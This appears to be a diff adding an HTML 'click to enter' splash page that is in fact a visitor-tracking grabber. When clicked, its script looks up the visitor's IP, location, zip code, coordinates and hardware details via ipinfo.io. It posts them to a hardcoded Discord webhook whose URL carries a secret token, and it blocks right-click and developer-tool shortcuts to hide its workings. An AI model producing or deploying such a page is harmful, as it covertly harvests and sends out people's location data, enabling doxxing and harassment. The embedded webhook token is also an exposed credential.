@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title> | :P | @loslassen</title>
+<style>
+  body, html {
+    height: 100%;
+    margin: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    font-family: 'Courier New', Courier, monospace;
+    background-color: black;
+    color: rgba(255, 255, 255, 0.9);
+    font-size: 20px;
+    overflow: hidden;
+    text-shadow: 0 0 10px rgba(255, 255, 255, 0.9), 0 0 20px rgba(255, 255, 255, 0.9), 0 0 40px rgba(255, 255, 255, 0.9);
+    cursor: pointer;
+  }
+  .click-text {
+    font-size: 24px;
+    text-align: center;
+    filter: brightness(150%);
+  }
+  .fullscreen-bg {
+    position: fixed;
+    top: 0;
+    left: 0;
+    width: 100%;
+    height: 100%;
+    z-index: -1;
+    overflow: hidden;
+  }
+  .fullscreen-bg video {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    transform: translate(-50%, -50%);
+    display: none;
+    filter: brightness(50%);
+  }
+  .user-info {
+    position: absolute;
+    top: 50%;
+    left: 50%;
+    transform: translate(-50%, -50%);
+    text-align: center;
+    z-index: 1;
+    display: none;
+  }
+</style>
+</head>
+<body>
+
+<div class="click-text" id="clickText">CLICK TO ENTER...</div>
+
+<div class="fullscreen-bg">
+  <video id="bgVideo" loop playsinline>
+    <source src="assets/whenay.mp4" type="video/mp4">
+    Your browser does not support the video tag.
+  </video>
+</div>
+
+<div class="user-info" id="userInfo">
+  <p style="font-size: 24px;">! cmon dude.. ! - loslassen !</p>
+  <p>IP Address: <span id="ipAddress"></span></p>
+  <p>Country: <span id="country"></span></p>
+  <p>Region: <span id="region"></span></p>
+  <p>Zip Code: <span id="zipCode"></span></p>
+  <p>Full location: <span id="fullLocation"></span></p>
+  <p>Timezone: <span id="timezone"></span></p>
+  <p>Current time: <span id="currentTime"></span></p>
+  <p>Latitude: <span id="latitude"></span></p>
+  <p>Longitude: <span id="longitude"></span></p>
+  <p>CPU Threads: <span id="cpuThreads">Loading...</span></p>
+  <p>GPU Info: <span id="gpuInfo">Loading...</span></p>
+  <p>Device: <span id="deviceInfo">Loading...</span></p>
+</div>
+
+<script src="assets/sparkle.js"></script>
+
+<script>
+function sendWebhook(data) {
+  const webhookUrl = 'https://discord.com/api/webhooks/1278466447294595204/91fNBAh--vvkY_v_EtyyzAWIBIvx21_sqiEZ8Rf4DMoMeoFyeHCbjOzK6nRgVF_EdCht'; // ↨0<5=8B5 =0 20H URL 251EC:0
+
+  const payload = {
+    content: "",
+    embeds: [
+      {
+        title: "smd",
+        description: `**IP Address:** \`${data.ip}\`\n**Country:** \`${data.country}\`\n**Region:** \`${data.region}\`\n**Zip Code:** \`${data.postal}\`\n**Full Location:** \`${data.city}, ${data.region}, ${data.country}\`\n**Timezone:** \`${data.timezone}\`\n**Current Time:** \`${data.currentTime}\`\n**Latitude:** \`${data.latitude}\`\n**Longitude:** \`${data.longitude}\`\n**CPU Threads:** \`${data.cpuThreads}\`\n**GPU Info:** \`${data.gpuInfo}\`\n**Device:** \`${data.platformInfo}\``,
+        type: "lalalalalalala",
+        color: 0x7269da,
+      }
+    ]
+  };
+
+  fetch(webhookUrl, {
+    method: 'POST',
+    headers: {
+      'Content-Type': 'application/json'
+    },
+    body: JSON.stringify(payload)
+  })
+  .then(response => {
+    if (response.ok) {
+      console.log('Webhook sent successfully');
+    } else {
+      console.error('Error sending webhook', response.statusText);
+    }
+  })
+  .catch(error => {
+    console.error('Error sending webhook', error);
+  });
+}
+
+function playVideo() {
+  var video = document.getElementById('bgVideo');
+  video.style.display = 'block';
+  video.play();
+
+  var clickText = document.getElementById('clickText');
+  clickText.style.display = 'none';
+
+  var userInfo = document.getElementById('userInfo');
+  userInfo.style.display = 'block';
+
+  document.body.removeEventListener('click', playVideo);
+
+  clickText.style.textShadow = 'none';
+
+  fetch('https://ipinfo.io/json')
+    .then(response => response.json())
+    .then(data => {
+      var [latitude, longitude] = data.loc.split(',');
+
+      var currentTime = new Date().toLocaleTimeString();
+      var platformInfo = navigator.platform;
+      var cpuThreads = navigator.hardwareConcurrency ? navigator.hardwareConcurrency : 'N/A';
+
+      var canvas = document.createElement('canvas');
+      var gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+      var gpuInfo = gl ? gl.getParameter(gl.RENDERER) : 'N/A';
+
+      var userInfo = {
+        ip: data.ip,
+        country: data.country,
+        region: data.region,
+        postal: data.postal,
+        city: data.city,
+        timezone: data.timezone,
+        latitude: latitude,
+        longitude: longitude,
+        currentTime: currentTime,
+        platformInfo: platformInfo,
+        cpuThreads: cpuThreads,
+        gpuInfo: gpuInfo
+      };
+
+      document.getElementById('ipAddress').textContent = data.ip;
+      document.getElementById('country').textContent = data.country;
+      document.getElementById('region').textContent = data.region;
+      document.getElementById('zipCode').textContent = data.postal;
+      document.getElementById('fullLocation').textContent = `${data.city}, ${data.region}, ${data.country}`;
+      document.getElementById('timezone').textContent = data.timezone;
+      document.getElementById('latitude').textContent = latitude;
+      document.getElementById('longitude').textContent = longitude;
+      document.getElementById('currentTime').textContent = currentTime;
+      document.getElementById('deviceInfo').textContent = platformInfo;
+      document.getElementById('cpuThreads').textContent = cpuThreads;
+      document.getElementById('gpuInfo').textContent = gpuInfo;
+
+      sendWebhook(userInfo);
+    })
+    .catch(error => console.error('Error fetching IP info:', error));
+}
+
+document.body.addEventListener('click', playVideo);
+
+var video = document.getElementById('bgVideo');
+video.addEventListener('ended', function() {
+  this.currentTime = 0;
+  this.play();
+});
+
+document.addEventListener('DOMContentLoaded', function() {
+  var clickText = document.getElementById('clickText');
+  var text = "CLICK TO ENTER...";
+  var index = 0;
+  var interval = setInterval(function() {
+    if (index <= text.length) {
+      clickText.textContent = text.slice(0, index++);
+    } else {
+      clearInterval(interval);
+    }
+  }, 50);
+
+  let msg1 = " | :D | @loslassen";
+  const speed = 100;
+
+  function scrollTitle() {
+    document.title = msg1;
+    msg1 = msg1.substring(1) + msg1.charAt(0);
+    setTimeout(scrollTitle, speed);
+  }
+
+  scrollTitle();
+});
+
+document.addEventListener('contextmenu', function(e) {
+  e.preventDefault();
+});
+
+document.addEventListener('keydown', function(e) {
+  if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && e.key === 'I')) {
+    e.preventDefault();
+  }
+});
+</script>
+
+</body>
+</html>
